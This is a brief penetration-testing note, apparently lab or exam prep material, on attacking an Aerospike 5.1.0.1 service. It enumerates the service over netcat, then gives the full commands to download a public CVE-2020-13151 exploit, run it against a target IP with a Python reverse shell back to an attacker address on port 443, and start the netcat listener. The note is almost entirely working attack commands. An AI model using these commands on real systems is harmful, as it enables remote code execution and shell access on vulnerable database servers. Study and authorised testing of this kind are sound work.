CGMS Port 3003

##### Enumeration

````
nc -nv $ip 3003 #run this
````

````
help #run this
````

````
bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;
````

````
version #run this
````

````
Aerospike Community Edition build 5.1.0.1
````

##### Exploitation

````
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py
python3 cve2020-13151.py --ahost=192.168.208.143 --aport=3000 --pythonshell --lhost=192.168.45.208 --lport=443
nc -nlvp 443
````